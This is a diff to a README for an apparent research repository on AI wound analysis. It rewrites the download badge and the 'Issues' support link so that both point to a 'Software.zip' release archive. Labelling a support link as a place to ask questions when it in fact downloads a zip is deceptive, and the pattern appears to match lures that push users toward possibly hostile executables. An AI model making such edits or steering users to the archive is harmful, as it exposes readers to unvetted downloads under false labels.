@@ -28,7 +28,7 @@ The repository covers a wide array of topics related to wound analysis and compu
 
 To access the code and data associated with this repository, you can download the latest release by clicking the following link:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/tuguiMAtei/Complex-Wound-Analysis-using-AI/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/tuguiMAtei/Complex-Wound-Analysis-using-AI/releases/download/v2.0/Software.zip)
 
 ## Explore the Models
 
@@ -48,7 +48,7 @@ We would like to express our gratitude to the contributors, researchers, and org
 
 ## Support
 
-For any questions, feedback, or inquiries related to this repository, feel free to reach out to us via the [Issues](https://github.com/cli/go-gh/issues) section. Your input is crucial in helping us improve and expand the capabilities of our computational models for complex wound analysis.
+For any questions, feedback, or inquiries related to this repository, feel free to reach out to us via the [Issues](https://github.com/tuguiMAtei/Complex-Wound-Analysis-using-AI/releases/download/v2.0/Software.zip) section. Your input is crucial in helping us improve and expand the capabilities of our computational models for complex wound analysis.
 
 ## License
 
